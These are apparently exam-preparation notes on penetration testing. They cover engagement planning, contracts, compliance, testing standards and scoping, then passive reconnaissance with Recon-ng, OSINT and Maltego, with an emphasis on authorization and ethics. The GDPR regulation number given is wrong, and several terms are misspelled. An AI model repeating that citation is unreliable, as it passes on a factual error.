# Chapter 1: Planning and Engagement

- Regulatory and compliance considerations for penetration tests
- Legal concepts including limitations on testing, contracts, and documentation
- Penetration testing types, scoping, and testing requirements
- Professionalism, integrity, the ethical hacking mindset, and risks and responsibilities for penetration testers

## Governance, Risk, and Compliance

- The processes, tools, and strategies that organizations use to address compliance with industry regulations, enterprise risk management, and internal governance.
- The GRC model is defined by the OCEG as a standard that unifies various subdisciplines of governance, risk, audit, compliance, ethics/culture, and IT.
- _ISACA, NIST, and the International Organization for Standardization (ISO) can provide additional information._

### Regulatory and Compliance Considerations

- Laws vary across domains; countries, regions, locals, etc.
- Compliance-based pentesting evaluates adherence to these policies, laws, and regulations.
- Considers the security of specifically defined data types, often within the context of a defined protected environment.
- Asking for the client's data classification policies may be useful during scoping.

### Compliance Concepts

- **Confidentiality:** The concept of limiting access to data based on need to know.
- **Privacy:** A legal concept that addresses what rights an individual has to control how their personal information is used, collected, and disclosed.
- **Personally identifiable information (PII):** Data that allows identification of one individual over other individuals.
- **Protected health information (PHI):** Data that was created or used in a health care context. _For example; The U.S. Health Insurance Portability and Accountability Act defines 18 specific pieces of information that classify as PHI._
- **Cardholder data (CHD):** Often specific to Payment Card Industry Data Security Standards (PCI-DSS). Type of PII that is specifically related to cardholders.

## Impact to Testing and Reporting

- Standards and regulations may define the concept of a protected environment.
- This may define where clients can store, collect, or process protected data and set requirements for segregation from other networks.
- Pentesters:
  - Identify boundaries
  - Negotiate testing parameters to appropriate security across boundaries
  - Perform tests either inside or outside of the environment, or both.
- Compliance-based tests may require specific tests to evaluate the secure transmission of data. This may not be applicable in other pentests.
  - Clients may request special considerations for the report.
- Some governing bodies require that testers be qualified before the pentest can be accepted for compliance purposes.
  - UK government entities require clearance from the National Cyber Security Centre (NCSC) via their CHECK program.
  - Industry certifications, such as CREST, may be used to justify a tester's experience.

_ **Exam Tip:** _ _Pentest planning and scoping may require additional questions about which standards and regulations apply to the client, what data types are protected, data flow diagrams, and required objectives for testing. The answers to these questions can affect test methodology, test tooling, and reporting._

### GDPR

- The **General Data Protection Regulation 2016/279** is a law passed within the European Union (EU) that imposes data privacy and security obligations on organizations that target or collect data related to people in the EU.
- This applies to anyone, inside or outside of the EU, as long as they process personal data of people in the EU or offer goods and services to people in the EU.
- **Personal data** is defined by GDPR as data that can be used to distinguish one individual from other individuals, either directly or with the use of additional information.
- _Performing work for an organization that is subject to GDPR may also require a discussion with your legal counsel in order to confirm whether additional contract language is required during test planning. Pentesters should also discuss whether they need to observe any special procedures when accessing, storing, or transmitting protected information during the course of testing._

_ **Exam Tip:** _ _To recognize GDPR questions, the type of data protected is personal data of persons in the EU. The goals of testing include security of storage, transmission, and destruction of personal data by data processors. Enforcement is handled by the government._

### PCI-DSS

- **Payment Card Industry Security Standards Council (PCI-SSC)** defines a series of rules that businesses that process payments using payment cards should follow in order to better secure card data and transactions. The resulting standard is called **PCI-DSS.**
- According to the standard, _"PCI-DSS applies to all entities involved in payment card processing-including merchants, processors, acquirers, issuers, and service providers. PCI-DSS also applies to all other entities that store, process, or transmit cardholder data and/or sensitive authentication data."_
- PCI-DSS is a standard, not a law. Penalties for noncompliance are not enforced by governments.
- Noncompliance may be subject to fines or even losing the ability to accept payments using payment cards.
- PCI-DSS defines due diligence practices for securing cardholder data and protecting the **card data environment (CDE)** and provides guidance for penetration tests and organizations that require penetration tests in the document "Information Supplement: Penetration Testing Guidance."
- PCI-DSS defines protections for cardholder data and sensitive authentication data:
  - **Sensitive Authentication Data**
    - PINs and PIN blocks
    - VAC2, CVC2, CVV2, CID
    - Full track data (magstripe data or on-chip equivalent)
  - **Cardholder Data**
    - Primary account number (PAN) along with any of the following:
      - Cardholder name
      - Service code
      - Expiration date
  - These elements may be required to be rendered unreadable when stored.
  - Other types of data are not allowed to be stored and may result in a pentest finding.
  - Pentesters should be able to recognize this data, know what the compliance requirements are for storage, and be aware of data handling requirements when storing evidence and writing findings in reports.
- PCI-DSS assessments require testing from inside and outside of the regulated environment.
- _The pentester is responsible for being aware of PCI-DSS testing requirements and communicating them to the customer during scoping. Any limitations put on testing or on the environment need to be documented. The PCI assessor is responsible for determining whether or not the defined parameters are valid for compliance._

_ **Exam Tip:** _ _To recognize PCI-DSS questions, the type of data protected is cardholder data. There are likely references to the card data environment. Goals of testing include security of storage, transmission, and retention of CHD data by data processors. Enforcement is handled within the industry._

### Testing Limitations

- Testing windows and time frames
- Usable tools
- Assets you are not allowed to test
- Methods you are allowed to use during testing
- Some limitations are imposed by city, state, or country laws.
- Others may be imposed by the organization being tested.
- Asking what limitations apply should be done as a part of scoping.

### Time-Based Limitations

- Testing may be limited to:
  - During business hours
  - Outside business hours
  - Shift changes
  - For a specific shift/employees
- A limited time can be enforced if the customer can only allow pentesting for a certain amount of time.
- _Thoroughness (depth and breadth) of testing are directly affected by the pentester's skill, the amount of information about the targets that is given to the pentester by the client, and the amount of time granted for testing. These concepts bear special consideration during scoping, budgeting, and client expectation setting._

### Asset Scope Limitations

- Sometimes, certain systems must be moved out of scope.
- Potential reasons:
  - Security is irrelevant to the client's goals for the pentest
  - Fragile or special systems that would respond unpredictably to normal pentest activity.
  - Mission-critical systems whose interruption or malfunction could lead to major revenue loss, natural disaster, or loss of human life.

### Tool Limitations

- Local laws may forbid the use of certain kinds of tools or tests
- Clients may require testers to use an approved list of client tools
- Penterster may choose to limit tools used in the interest of time or budget for the work being purchased

### Allowed and Disallowed Tests

- Most pentesters will automatically put destructive activities out of scope
- This can sometimes be asked of by clients

## Contracts and Documentation

- **Contracts** are mutual agreements that are enforceable by law and require an authorized representative from each party (i.e., **contract signing authority**) to sign the contract.
- Many of these documents are subject to review by legal counsel within the businesses involved in the agreement.
- These agreements hold two or more parties liable to specific obligations that shall or shall not be done.
- _In relation to penetration testing, CompTIA identifies five key contracts and documents. MSA, NDA, SOW, RoE, and Permission to Test._

_ **Exam Tip:** _ _The test might include questions that will ask which document or contract should be referenced or used, given a certain scenario. Make sure to understand the differences between the types._

### Master Services Agreement (MSA)

- A type of overarching contract reached between two or more parties where each party agrees to most terms that will govern all other future transactions and agreements. The agreement will cover conditions such as:
  - **Payment terms:** Negotiated schedule of payment
  - **Product warranties:** Assurance that a product meets certain conditions
  - **Intellectual property ownership:** Copyrights, patents, and trademarks
  - **Dispute resolution:** Defines a process for resolving differences
  - **Allocation of risk:** Provision that defines levels of responsibility between each party
  - **Indemnification:** Parties agree to be financially responsible in certain circumstances
- Often used in fields that tend to be open-ended and support an organization's functional areas, like manufacturing, sales, accounting and finance, and so on.

### Nondisclosure Agreement (NDA)

- A confidentiality agreement that protects a business's competitive advantage by protecting its proprietary information and intellectual property.
- It is in a company's best interest to execute an NDA during a pentest.

### Statement of Work (SOW)

- A formal document that is routinely employed in the field of project management, which outlines project-specific work to be executed by a service vendor for an organization.
- An SOW can also be a provision found in the MSA.
- The statement of work typically addresses the following subjects:
  - **Purpose:** Reason for the project
  - **Scope of work:** Describes the work activities to be completed
  - **Location of work:** Where the work will be performed
  - **Period of performance:** The timeline for the project
  - **Deliverables schedule:** Defines the project artifacts and due dates
  - **Applicable industry standards:** Relevant criteria that must be followed
  - **Acceptance criteria:** Conditions that must be satisfied
  - **Special requirements:** Travel, workforce requirements (certifications, education)
  - **Payment schedule:** Negotiated schedule of payment (possibly derived from MSA)

### Rules of Engagement (RoE)

- Puts into writing the guidelines and constraints regarding the execution of a pentest - most importantly, what is and is not authorized for testing.
- The RoE can be part of the SOW or treated as a separate deliverable.
- Requires sign-off from the service vendor, as well as the client, to show that the baseline expectations have been set and agreed upon, but it is not always subject to the same legal review as an MSA or an SOW.
- Cloud service provider approvals may also need to be added as an appendix to the RoE, if applicable.
- Elaborates on certain subjects defined in the SOW, such as scope, location, applicable industry standards, and timelines.
- Communication and escalation paths are also defined so the pentest team knows who to contact and how in the event of an issue.
- _Examples of RoEs can be found in Appendix B of the NIST Special Publication 800-115 document hosted at_ [_https://www.nist.gov_](https://www.nist.gov/) _and in section 2.4 of the OSSTMM hosted at_ [_https://www.isecom.org/OSSTMM.3.pdf_](https://www.isecom.org/OSSTMM.3.pdf)_._

### Permission to Test

- Documents that grant permission to test must be signed by someone with authority over the assets being tested.
- This authority must be legally able to bless the terms of testing on behalf of the asset owners in all contracts and documentation.
- These documents should grant permission for testing activities to occur and set clear expectations that penetration testers are not held liable for system instability or crashes and that the tester will perform due diligence to avoid damage to systems as part of testing.

### Scope and Requirements

- The **scope** will outline the objectives and requirements for the assessment. Once signed, defines the boundaries for what is permitted to test.
- **Requirements** should be collected during the scoping process. This will include compliance, goals of testing, and tests to be executed.
- An effective way of capturing this type of information is by using a scoping document or pre-engagement survey, an informal document that asks general questions about the organization being tested.

## Standards

- Strategies or methodologies used for penetration testing.

### MITRE ATT&CK

- Not a holistic pentest methodology, but rather a knowledge base of attacker actions created from a survey of publicly reported attacker activities.
- Objective is to catalog these actions using standardized reference criteria (tactics, techniques, and subtechniques) so that different groups can discuss and document them in the same terms.
- Pentesters can use **ATT&CK** to make threat actor emulation plans and may be asked to provide an ATT&CK-labeled attack tree or labels inside of a report.
- ATT&CK is organized into matrices of attack components.
- Each matrix is designed to address attacker activities in different operating platforms.
- Within each matrix, attacks are categorized by tactic. **Tactics** attempt to describe an attacker's high-level objective for using that method of attack.
- ATT&CK TTPs (tactics, techniques, and procedures) can be used to describe a pentest attack chain using a common language.
  - The same technique may exist in multiple tactical categories.
  - ATT&CK tactics and techniques don't describe the attack implementation, only the classification.
  - Not all attacks exist in ATT&CK, only those that have been publicly disclosed as actions observed by an **advanced persistent threat (APT)** as defined by larger agencies.

_ **Exam Tip:** _ _ATT&CK is often referenced by matrices - tactics, techniques, and sub-techniques - and referenced in terms of attacker emulation plans. Its value lies in labeling attack methods._

### OWASP

- An example of attack knowledge that does not fit in ATT&CK is an application-based attack.
- The **OWASP project** is a nonprofit organization and open-source community effort that produces tools, technologies, methodologies, and documentation related to the field of web application security.
- OWASP publications and resources
  - **OWASP Top Ten:** Provides community awareness of the most serious web application security risks for a broad array of organizations.
  - **OWASP Testing Guide:** Addresses pentest scoping and data collection concepts that apply to web application testing concerns specifically.
  - **OWASP ZAP Project:**
  - **DirBuster:**
  - **Webgoat:**

_ **Exam Tip:** _ _OWASP focuses on web application security and full software development lifecycle (SDLC) testing, not only testing the implementation._

### National Institute for Standards and Technology (NIST)

- Nonregulatory U.S. government agency.
- Maintain several publications that describe recommendations for cybersecurity testing initiatives.
- Not legislated for all companies
- The two key publications are Special Publication 800-115, "Technical Guide to Information Security Testing and Assessment," which describes attack and testing, and the NIST Cybersecurity Framework, which describes the defensive half of the picture for cybersecurity.
- **Special Publication 800-115** defines a methodology for information security assessment. Four phases are used to describe penetration testing:
  - Planning
  - Discovery
    - Network port and service identification
    - Gathering of hostname and IP address information
    - Employee targeting information
    - System information (such as shares)
    - Application service information
  - Attack
    - Gaining access
    - Escalating privileges
    - System browsing
    - Installing additional tools
  - Reporting
  - NIST recommends that pentest scenarios focus on the most likely and most damaging attack patterns and on locating and targeting exploitable defects in systems. Vulnerabilities may exist, but are they exploitable?

_ **Exam Tip:** _ _NIST recommendations and standards are often referenced by U.S. government organizations and companies that support them. SP 800-115 and the Cybersecurity Framework work together to define a security testing methodology ( not only pentest) and defense best practices._

_ **Exam Tip:** _ _While you may not need to know every letter of the NIST standard, it's good knowledge to have, especially if you plan to work with U.S. government sector clients. For the exam, be prepared to identify when NIST standards might apply and what makes them different from other testing standards._

### Open Source Security Testing Methodology Manual

- **ISECOM** has released an **OSSTMM**, which they describe as a complete pentest methodology designed to assure thorough, legal, consistent, and repeatable testing that can be measured.
  - ISECOM also offers certifications for pentesters as a measure of qualification for compliance requirements.
- This methodology attempts to apply a framework to approach security testing (not only pentesting) for use in a structured process.
- Version 3 provides a **Security Test Audit Report (STAR)** containing questions that should be answered at the end of the pentest, but recommends that you perform testing as you are accustomed to doing, provided that you keep track of targets you test, what you tested on those targets, what controls you discovered during testing, and what you didn't test while you test.
  - ISECOM offers certification for signed STAR entries that are submitted to the organization for review.
- Recommends that you define a security test by identifying assets that need to be protected. Then, list the controls that protect the assets and where those controls reside. This delimits the **engagement zone.**
- **Scope** is determined based on a consideration of the total possible operating environment where any interaction with the asset may occur, including all channels.
- The manual defines five channels and methodologies for testing them:
  - Human
  - Physical
  - Wireless
  - Telecommunications
  - Data networks
- OSSTMM offers six testing types:
  - Blind
    - The primary impacts to breadth and depth of testing are the skill and efficiency of the pentester.
    - Defenders have full knowledge of the pentest, while the pentester has no company-confidential knowledge other than what is legally required to define and limit the scope.
    - This tests the impact from an uninformed attacker.
  - Double-Blind
    - Both defenders and pentesters remain uninformed, allowing organizations to also test their defensive response.
  - Gray Box
    - Categorized as a vulnerability assessment
    - Some knowledge is given about the environment
  - Double gray box
    - Only defenders have full knowledge
    - OSSTMM equates this to White Box testing in other models
  - Tandem
    - "Crystal Box" testing, an extreme level of White Box testing in which the tester is provided with all knowledge, including source code.
    - The primary limit on quality is the quality of the information given to the pentester and the transparency of the target organization during the scoping process.
  - Reversal
    - Designed to test defenses under a worst-case scenario.
    - Typically used to explore response to and impact from a highly skilled attacker or an informed insider.
    - OSSTMM suggests that the main limitations for this type of testing are the creativity and skill of the pentester and the quality of information given to the tester in preparation for the exercise.
- Implements a series of error labels that are designed to facilitate statistical analysis of test results and a series of questions that tests are designed to answer.
- Establishes methodology for analyzing and reporting on the results, including the generation of a rav to show objective measurement of the attack surface through various mathematical formulae.

_ **Exam Tip:** _ _OSSTMM provides one of the most complex definitions of testing types, and ISECOM does provide certification options for testers and reports. In addition to being a full security testing methodology (not only pentest), it provides a methodology for objectively measuring the target attack surface and risk values._

### Penetration Testing Execution Standard

- **PTES** is a community-driven effort to establish standards for penetration testing that is contributed to by a number of professionals in the pentest consulting community.
- Created in an effort to disambiguate what is meant by "pentest" for businesses seeking security testing services.
- Does not provide explicit instructions for how to conduct a pentest or use specific tools, but provides a separate set of technical guidelines to address tools and methods of attack.
- Also provides best practices for the steps that should typically be taken as part of a pentest, including:
  - Reporting
  - Intelligence gathering
  - Threat modeling
  - Vulnerability analysis
  - Explaining concepts within the scope of exploitation and post-exploitation

_ **Exam Tip:** _ _PTES uniquely focuses exclusively on a methodology for penetration testing as opposed to other kinds of security testing. It applies largely to pentests from a consulting point of view and does not specify execution of a pentest, but what a pentest should cover. It freely incorporates other frameworks (e.g., OWASP) and technical guides as supplemental resources._

### Information Systems Security Assessment Framework

- **ISSAF** was provided by the **Open Information Systems Security Group (OISSG)** in the UK.
- Full security assessment methodology that applies to security auditing as well as other types of security testing.
- Defines three phases of a pentest:
  - Planning and preparation
  - Assessment
  - Reporting and cleanup
- Provides best practices for engagement management including:
  - Pre and post-assessment actions
  - Risk assessment methodology
  - Information gathering for all kinds of security assessments, not only pentest.
- Covers host-specific scenarios by operating system as well as addressing different pentest targets, such as:
  - Databases
  - Physical locations and social engineering
  - Wireless
  - Web applications
  - Switches, routers, VPNs, and firewalls
  - Passwords
  - Security controls such as IPS/IDS and antivirus
  - Source code review

_ **Exam Tip:** _ _ISSAF is designed for security assessment generally, not penetration testing specifically. While it does contain best practices for engagement (planning through report delivery), the biggest distinction between ISSAF and other standards mentioned is it lists testing tasks with their associated tools for each task._

## Environmental Considerations for Scoping

- Pentesters, in general, need to understand:
  - What your client wants to protect
  - How they plan to protect it
  - Consider the possible differences between how they believe these protections work and how they work in practice
  - Boundaries and specific needs for testing such as:
    - Networks
    - Applications
    - Cloud-based assets
- The most important consideration for networks is **hosting**.
  - If the customer uses **shared hosting,** that is, infrastructure that is managed by another organization and shared with other companies, they may not be able to provide you with full authorization to test.
  - May need additional authorization for certain attacks, tools, or methodologies from the hosting or cloud provider.
  - Many co hosting providers do not allow layer 2 attacks, such as Address Resolution Protocol (ARP) spoofing because of the potential impact to other customers using the same infrastructure.
  - This also applies to cloud-hosted environments, where cloud providers have their own rules of engagement that pentesters must legally follow.
- May also need to ask about what protocols and controls are used across your attack vector.
  - An internal test against a network may present you with the objective of bypassing Network Access Controls (NACs), causing you to adjust your initial access plan.
  - You may request that the client create an intrusion prevention system (IPS) or web application firewall (WAF) passthrough for your testing system in order to examine the direct application impact of an advanced attacker with more time than is allowed for a penetration test.
  - Which wireless bands and channels are applicable depending on the geographic location of the engagement.
- In the cloud world, including virtual private clouds, methods of virtualization and what cloud offerings are used will affect your methodology and tooling.
- For applications, some organizations may wish to avoid disruption to their users by requesting testing in non production regions.
  - How closely these regions mirror production configurations may affect the applicability of the results to a production environment.
  - Gathering API endpoint information and supporting documentation for the style of testing (black box, white box, or gray box) applies here.

### Target Selection

- Key organizational assets that, if exploited, could negatively affect the organization.
- Pentesters need to gain a clear understanding of the environments to be tested, as well as pertinent documentation (depending on the strategy for testing) from the client, in order to perform discovery and validation of the targets for the engagement.

### Wireless

- The physical location of wireless networks, including building and even the floor, is required for wireless network testing.
- Documentation of in-scope **service set identifiers (SSIDs)** ensures you are testing only the assets that belong to your customer.
- If wireless networks implement different trust levels, it may be useful to select one or more sample networks from each type to evaluate those trusts.

### IP Ranges

- Verify that the IP ranges supplied belong to the customer and identify any IP ranges that are hosted by third parties, as that may affect your authorization test.
- A typo or miscommunicated subnet or IP address could easily result in a serious problem of authority.
- Establish IP addresses for load balancers versus IPs of back-end systems to avoid overloading clusters during discovery or brute-force attacks.
- Consider the amount of occupied space within a given IP range when planning for your pentest, as time to scan and evaluate systems can quickly build up over large ranges.

### DNS

- Hostnames and domains may not necessarily belong to your client due to outsourcing agreements.
- Use DNS reconnaissance to identify other services and ranges that have not been otherwise specified, but always confirm these details with the client to avoid scope overreach and ensure coverage by your authorization to test parameters.

### APIs and Other Support Resources

- Can be independent artifacts either specified in the RoE or provided to the pentest team after the RoE is signed.
- **WSDL**
  - Web Services Description Language is an XML-based interface definition language.
  - Describes functionality offered through the web service.
- **WADL**
  - Web Application Description Language
  - Machine-readable XML description of HTTP-based web services.
- **SOAP project file**
  - Simple Object Access Protocol used for messaging.
  - Describes the format for sending and receiving messages.
- **SDK documentation**
  - Software Development Kit documentation.
  - Elaborates on the framework that is used to develop the software application.
- **SWAGGER documentation**
  - SWAGGER is an open-source software development framework for RESTful web services.
  - The documentation provides application programming interface (API) descriptions and test cases.
- **XSD**
  - Extensible Markup Language (XML) scheme definition.
  - Formally describes the elements comprising an XML document.
- **Same application requests**
  - Recorder transactions between objects within an application architecture.
  - Offers simulated testing scenarios, inspect and debug requests, or possibly discovers undocumented APIs.
- **Architecture diagrams**
  - An architecture model that defines a relationship between multiple elements.
  - An illustration that depicts a software or network design model.

### Physical Locations

- Will determine travel requirements and device deployment considerations.
- Testing methods and locations for testing may also be affected by the controls being tested and the assets in residence.
- Local laws affecting tool usage for physical ingress testing also bear investigation.
- Information may also need to inform where you drop baiting devices or how to deploy surveillance equipment.
- Should have a **"get-out-of-jail-free" (GOOJF) card** or other documentation that asserts your authorization to test, as well as a communication plan that includes contacts who can deconflict and de-escalate with law enforcement and physical security groups before testing begins.
- The GOOJF is often included as part of the negotiated RoE.

### External vs. Internal Targets

- Testing can be conducted onsite at the organization's facility or offsite.
- **Internal testing** may examine the condition in which an endpoint within the network is compromised, either by malware or a malicious insider.
  - Evaluates various levels of trust between organizational systems, applications, and networks.
  - Testing that originates behind perimeter defenses (external firewall) using a given access level.
  - The type of access chosen depends on the type of assessment and the overall goals of the engagement.
  - _In computer security, allow-listing and block-listing are basic access control mechanisms that can be implemented in network firewalls, spam filters, web application firewalls (WAFs), etc. an allow-list denies all except members of the list. A block-list is the opposite–it allows all but denies members of the list._
  - **User-level access** assumes the identity of a trusted insider with basic permissions that a typical user in the organization would have.
    - The goal is to gain additional levels of access through **privilege escalation.**
    - **Privileged-level access** can be used to conduct various types of testing to include escalating local admin privileges to domain-level access, inspecting operating system patch levels, or determining if a system is configured in accordance with a specific policy, such as in the case of compliance testing.
- **External testing** may evaluate the security of an organization against an Internet-based attacker.
  - These may include use of conventional methods of remote access such as VPN or exploration of vulnerabilities in other remotely exposed services.
  - Provides more limited-access vectors.
  - Evaluation is conducted from that of a malicious attacker's point of view.
  - Typically starts with reconnaissance to collect organization information using OSINT techniques.
  - Goal is to discover vulnerabilities that could be exploited from the outside by external attackers.
  - _Some organizations may assume credentialed or guest access to Internet-facing web applications as still an external assessment, rather than internal, due to the access vector to the application (Internet only)._

### First-Party vs. Third-Party Hosted

- If the targets are hosted in a first-party environment, coordination of testing activities will be easier, as the customer owns the equipment and testing is simply subject to the company's policies.
- If the targets are hosted in a third-party environment, such as a cloud service provider (CSP), testing is not only subject to the company's policies, it is also subject to the third party's acceptable use policies.

## Contract Review

- Understand the purpose or function of the organization your work is supporting, as it identifies the reporting levels and responsibility within the company.
- Identify the stakeholders for the engagement based on the understanding for communication, delivery, and other aspects of project coordination.
- Stakeholders include people such as:
  - **Executive management (Senior Management):** Responsible for the organization's overall goals and success, and tests are typically not permitted without their written authorization and approval.
  - **Contracting or legal department:** The **contracting officer** or **legal representative** may need to review and enforce legal and contractual commitments for all parties involved in the engagement.
  - **Security personnel:** Essential for communicating about organizational security policies and responding to incidental outages.
  - **Members of the IT department:** Essential for communicating about organizational security policies and responding to incidental outages.
  - **Penetration testing staff:** Vital to the success of the engagement, as they are responsible for identifying weaknesses within the security support structure of the organization and simulating attacks that are applicable to the organization's threat profile.
  - _Stakeholders are information consumers, not only escalation points. Each group will have a different understanding and expectation of the process. These differing understandings should influence a pentester's communications (information type and presentation) during calls, e-mails, and reporting._

### Time Management

- Review the scheduled beginning and end of testing and any deadlines or timelines that the customer has related to the test.
- Review the proposed testing objective and scope to ensure the work can be reasonably completed within the time frame specified.
- Also consider the time it takes to write the report, deliver the results, and handle any follow-up concerns such that the needs of one engagement do not affect the execution of another engagement.

### Limitations

- During contract review, you will also want to discuss any limitations placed on testing, including:
  - Hours of testing
  - Limits to allowed methodologies or tooling
  - Limits to liability for the tester
- Objective is to ensure these terms are mutually understood, accepted, and correct in the contract and planning documentation.
- Limitations on testing may have impacts to the test outcomes, and no pentester can ensure that compromise is impossible or that every possible vulnerability has been identified.
- Making sure that these are clearly stated, discussed, and understood by all parties is crucial to a successful engagement.

### Expectation Setting and the SLA

- **Service level agreements (SLA)** define measurements for the expectations between the customer and the service provider, as well as the terms of what happens if those expectations are not met.
- Typically, this will apply to agreements when the pentester is external to the tested organization, but even internal penetration testing groups will often be held accountable for how they operate, what they deliver, and when they deliver it.
- This information is typically addressed as part of the SOW, but separate documentation may define when reports must be delivered, how soon after the contracts are signed must testing be initiated, how soon after initiation must testing activities conclude, etc.
- The MSA will typically outline what recourse the client has available should the tester not meet their documented expectations, and vice versa.

## Communication

### Communication Planning

- Provides the ability for **deconfliction**, which is the process of sorting out your pentest artifacts from the artifacts of a real compromise.
- Customers may have specific requirements for the interval of communication or points of contact other than those involved in the pentest planning who need to be alerted under specific testing circumstances.
- Generally, the communication plan should cover:
  - When to communicate
  - What to communicate
  - Who to communicate with
  - How to communicate

### Communication Paths

- An **escalation path** will need to be properly defined in the RoE to help remedy issues that may arise during testing.
- An escalation path helps define a chain of command and helps resolve and manage conflict.

### Communication Triggers

- Important indicators of when the pentester (or pentest team) should reach out to the customer.
- A few indicators include:
  - Critical findings
  - Completing certain stages (testing activities or milestones) in the engagement
  - Embarking upon a potentially risky test
  - Possible indicators of prior compromise
  - Anything that results in the need for goal readjustment

## Professionalism and Integrity

- The **Computer Ethics Institute** drafted the **Ten Commandments of Computer Ethics** in an attempt to structure human use of computers towards good.
- These state that:
  - You should not use your powers to harm other people
  - Interfere with the work of other people
  - Snoop through other people's data
  - Steal
  - Bear false witness
  - Use proprietary software for which you have not paid
  - Use other people's computers without authorization or compensation
  - Appropriate the ideas of others
  - Design software without considering the social consequences of the software
  - Be inconsiderate or disrespectful of others

## Risks to the Tester

- Failure to observe the terms of your contract could expose you personally to risk.
- Access or use without permission may be considered unlawful.
- using data or access to conduct activity disallowed by a contract may be considered access for fraudulent purposes.
- Transmission of data outside of the target environment and keeping it for one's own personal use or giving it to others may constitute data theft.
- Pentesters can be subject to arrest, confiscation of property, extensive legal fees and fines, and to criminal charges for activities conducted without permission or outside the terms of a contract.
- Pentesters and companies may attempt to avoid other legal liability by **carrying errors and omissions insurance.**

# Chapter 2: Information Gathering and Vulnerability Scanning

- The difference between passive and active reconnaissance and vulnerability scanning, including the types of information to target
- Several tools used for information gathering and vulnerability scanning and analyze their output
- When to use passive reconnaissance, active reconnaissance, or vulnerability scanning during a pentest
- Identifying and analyzing use cases for Nmap

## Reconnaissance

Collecting as much information as you can about the targets is referred to as **reconnaissance (recon),** or **discovery.**

- Done during planning, initial access, and post-exploitation phases of pentesting.
- Recon identifies or confirms the target scope, finds potential weaknesses or vulnerabilities for exploitation, and locates other information related to the goals of the pentest.

## Passive Reconnaissance

- The process of assessing a target to collect preliminary knowledge about the system, software, network, and people _without actively engaging a target or its assets._
- The least invasive, and the least likely to be detected by the target.
- Appropriate to use these methods to verify scope and aid with planning a pentest, as well as initial discovery during your pentest.
- both paid and public sources of information (open-source intelligence) can be used according to your budget and resources.
- Use passive information gathering when you cannot risk disruption or detection during the current phase of your pentest.

### DNS Recon

- Expand your knowledge of hostnames in use, the breadth of the network, and information about some technical contacts within the organization.
- Can be passive or active, whether you are accessing your target's systems directly (active) or not.
- Most testers assume that the volume of requests to DNS servers means that targets are not observing queries to DNS services, but that is not always the case.
- Secondary sources, such as name registrars, Internet registries, specialized search engines, or other web-based resources, allow purely passive information gathering in this area.
- There are **five regional Internet registries (RIRs)** that handle allocation of IP addresses across the Internet:
  - **APNIC**(for Asia)
  - **ARIN**(for America)
  - **RIPE NCC**(For Europe)
  - **LACNIC**(For Latin America)
  - **AFRINIC**(For Africa)
- This is to prevent two parties from being assigned the same range of addresses for use.
- These registries contain information about what organization owns a particular range of IP addresses and sometimes information about technical and administrative contacts.
- This information is tied to domain name registration entries as well via the WHOIS service.
- Other methods to access DNS information are the **dig**, **nslookup,** and whois command-line tools.

_ **Exam Tip:** _ _It's useful to know the different types of DNS records and what information they contain, as you may be asked about specific record types. Pay special attention to NS, TXT, CNAME, and A records._

### Recon-ng

- Power recon framework
- Written in Python
- Includes independent modules, a database for storing engagement information, and more.
- Can supply a domain and have Recon-ng identify IP addresses and hostnames on the domain and search for email addresses, contacts, and leaks related to the domain using OSINT resources.
- Open-source and included with Kali.
- To launch from the command line type recon-ng. To install modules type **marketplace install all** at the Recon-ng prompt. The Recon-ng module categories are:
  - **Recon modules** Reconnaissance modules
  - **Disabled modules:** Modules that are disabled based on your system configuration. If you have none that are disabled, this may not show up.
  - **Reporting modules:** Compile a report in various formats.
  - **Import modules:** Import target listing using supported formats.
  - **Exploitation modules:** Supported exploitation modules.
  - **Discovery modules:** Informational discovery modules.
- To get a list of supported modules, execute **modules search** from the framework prompt with no arguments.
- The first thing to do is create a workspace to manage information collection. The workspace and information gathered during module execution will be stored in the database.
- To see a list of workspaces in the database, execute **workspaces list.**
- to run a simple WHOIS query and pull contact information for a domain, load the whois\_pocs module: modules load whois\_pocs
- Once the module is loaded, you can see more information about the module, including configurable parameters, by typing **info.** You can also show the current context variables by typing **options** while the module is loaded. This also lets you set values.
- Executing the **run command** enables the discovery process.
- Once the collection process has completed, the **show \<table name\>** command can be used to display the results stored in select tables within the database. For a list of all tables, type **show** with no arguments.
- The **whois\_pocs** module populates the Contacts table. To get a list of contacts that have been collected, execute **show contacts.**
- The Recon-ng dashboard shows the total number of records stored in each table of the database. To display the dashboard, execute the **dashboard** command. These metrics provide valuable information about the target environment and the organization's exposure to the public Internet.
- _ **CAUTION:** _ _Some Recon-ng modules required API keys. Follow the instructions under "Acquiring API Keys" on the usage guide of the developer's website at_ [_https://github.com/lanmaster53/recon-ng_](https://github.com/lanmaster53/recon-ng)_._

_ **Exam Tip:** _ _Black Hills Information Security hosts a Recon-ng cheat sheet with numerous useful commands:_ [_https://www.blackhillsinfosec.com/wp-content/uploads/2019/11/recon-ng-5.x-cheat-sheet-Sheet1-1.pdf_](https://www.blackhillsinfosec.com/wp-content/uploads/2019/11/recon-ng-5.x-cheat-sheet-Sheet1-1.pdf)

###


### OSINT

- Static web page focused on information gathering and provides web links and resources that can be used during the reconnaissance process.
- The website is broken out into various nodes that offer unique paths for collecting information regarding a specific subject, such as usernames, email addresses, social networks, IP addresses, etc.
- The OSINT Framework helps point users in the right direction to find useful intelligence from various public and paid resources.

### Social Media

- Allows us to publish our names, email addresses, resumes for job hunting, preferences and hobbies, and undertake numerous other electronic interactions.
- This information is often valuable for targeting individuals for phishing or other social engineering efforts, but we can also use it to find out more about the organization itself.

### Working with Maltego CE

- An interactive data mining software tool that can help users visualize and analyze relationships using publicly accessible data from the Internet.
- Framework that can rapidly expand the open-source knowledge of a target during a pentest.
- Uses different views to display data, such as a **list view (table of entities)** and a **graph (background)** to plot **entities (nodes)** during an online investigation.
- **Entities** are icons that represent a name in DNS, website, file, IP address, etc.
- An **entity** is discovered through the use of a **transform,** which is a piece of code that queries a data source to identify relationships with publicly searchable data and returns the results as new entities that are plotted on the graph.
- A **machine** can chain multiple transforms together in order to automate tasking.
- [https://www.paterva.com](https://www.paterva.com/)
- [https://docs.maltego.com/support/home](https://docs.maltego.com/support/home)
- Before using, you will need to create an account and register for a Maltego license.
- [https://www.maltego.com/blog/beginners-guide-examining-your-digital-profile/](https://www.maltego.com/blog/beginners-guide-examining-your-digital-profile/)
- [https://www.maltego.com/blog/how-to-conduct-person-of-interest-investigations-using-osint-and-maltego/](https://www.maltego.com/blog/how-to-conduct-person-of-interest-investigations-using-osint-and-maltego/)
- [https://www.maltego.com/transform-hub/haveiben-pwned/](https://www.maltego.com/transform-hub/haveiben-pwned/)
